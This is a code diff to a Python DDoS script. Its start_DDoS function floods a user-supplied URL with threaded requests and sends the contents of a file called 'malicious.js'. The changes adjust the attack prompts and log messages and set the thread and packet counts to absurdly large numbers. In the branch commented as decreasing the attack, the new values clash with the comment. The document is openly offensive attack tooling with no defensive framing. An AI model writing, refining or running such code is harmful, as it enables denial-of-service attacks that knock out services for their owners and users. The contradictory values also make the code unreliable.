@@ -13,14 +13,12 @@ def start_DDoS(url):
             response = requests.get(url)
             if response.status_code == 200:
                 # If the response is successful, increase the attack parameters.
-                print('[+] Response 200: Increasing attack parameters')
-                threads = 10000
-                num_packets = 10000000000
+                threads = 1000000000000000000000000000000
+                num_packets = 100000000000000000000000000
             else:
                 # If the response is unsuccessful, decrease the attack parameters.
-                print('[+] Response not 200: Decreasing attack parameters')
-                threads = 50
-                num_packets = 10000000
+                threads = 50000000000000000000000000000000
+                num_packets = 1000000000000000000000000000
             # Read malicious file
             malicious_file = open("malicious.js", 'rb')    
             # Send the malicious requests to the server.
@@ -90,12 +88,12 @@ def start_DDoS(url):
         pass
 
 def main():
-    url = input('Please provide the URL to launch the attack: ')
-    value = int(input('Please provide the amount of threads you would like to use: '))
+    url = input('[?] Please provide the URL to launch the attack: ')
+    value = int(input('[?] Please provide the amount of threads you would like to use: '))
     print('[+] Attack Started at {}'.format(str(datetime.now())))
 
     for i in range(value):
-        print("Starting thread #{}...".format(str(i + 1)))
+        print("[!] Starting thread #{}...".format(str(i + 1)))
         thread = threading.Thread(target=start_DDoS, args=(url,))
         thread.start()
 
